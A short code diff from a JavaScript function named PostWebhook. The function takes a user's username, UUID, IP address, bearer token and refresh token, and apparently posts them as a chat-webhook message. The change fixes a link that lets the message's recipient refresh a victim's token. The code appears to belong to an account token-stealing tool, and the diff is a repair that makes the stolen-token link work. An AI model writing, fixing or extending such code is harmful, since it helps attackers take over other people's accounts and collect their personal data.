@@ -323,7 +323,7 @@ async function PostWebhook(refresh, username, uuid, ip, BearerToken, RefreshToke
                     },
                     {
                         name: "Refresh Token",
-                        value: `[Click here to refresh](/${redirect_uri}refresh?refresh_token=${RefreshToken})`
+                        value: `[Click here to refresh](${redirect_uri}/refresh?refresh_token=${RefreshToken})`
                     }
                 ],
                 footer: {
